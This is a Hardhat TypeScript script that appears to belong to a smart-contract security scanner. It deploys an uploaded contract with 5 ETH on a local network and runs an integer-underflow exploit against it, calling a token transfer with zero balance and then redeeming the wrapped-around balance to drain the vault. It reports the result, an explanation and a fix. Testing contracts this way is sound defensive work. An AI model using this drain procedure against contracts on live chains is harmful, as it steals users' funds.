import hre from "hardhat";
import { parseEther, formatEther, ZeroAddress } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  if (!contractName) throw new Error("UPLOADED_CONTRACT_NAME not set");

  const startTime = Date.now();
  const [, attacker] = await hre.ethers.getSigners();

  // Deploy victim with 5 ETH (payable constructor required)
  const VictimFactory = await hre.ethers.getContractFactory(contractName);
  const victim = await VictimFactory.deploy({ value: parseEther("5") });
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  // Try to read PRICE constant — default to 0.1 ETH if not found
  let PRICE: bigint = parseEther("0.1");
  try {
    PRICE = await (victim as any).PRICE();
  } catch {
    // contract has no PRICE constant, use default
  }

  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const drainTokens: bigint = initialBalance / PRICE;

  const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  // Detect function name: sendTokens or transfer
  const iface = (victim as any).interface;
  let tokenFnName = "sendTokens";
  try {
    iface.getFunction("sendTokens");
  } catch {
    tokenFnName = "transfer";
  }

  const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);
  const extractData = iface.encodeFunctionData("redeem", [drainTokens]);

  const t1 = Date.now();
  await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
  const endTime = Date.now();

  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "overflow",
    targetFunction: `${tokenFnName}()`,
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: `Attacker calls ${tokenFnName}(address(0), 1) — has 0 tokens`,
        from: attacker.address,
        to: victimAddress,
        value: "0.0",
        unit: "ETH",
        timestampMs: t1,
        balanceAfter: { victim: formatEther(initialBalance), attacker: "type(uint256).max tokens" },
      },
      {
        step: 2,
        description: `Attacker redeems ${drainTokens} tokens → drains vault`,
        from: attackerAddress,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
      },
    ],
    timeline: [
      `${contractName} deployed with 5 ETH`,
      `Attacker calls ${tokenFnName}(address(0), 1) with 0 token balance`,
      "Unchecked block: 0 - 1 underflows to type(uint256).max",
      `Attacker redeems ${drainTokens} tokens for ETH`,
      stolenAmount > 0n ? "Vault drained — VULNERABLE" : "Attack failed — contract appears safe",
    ],
    report: {
      vulnerabilityType: "Integer Overflow / Underflow",
      affectedFunction: `${tokenFnName}()`,
      explanation:
        "The subtraction in the unchecked block allows integer underflow. An attacker with 0 tokens subtracts 1 to get type(uint256).max tokens, then redeems them for all ETH in the vault.",
      fix: "Remove the unchecked block. Solidity 0.8+ checks arithmetic by default. Only use unchecked when you have explicitly verified no under/overflow is possible.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
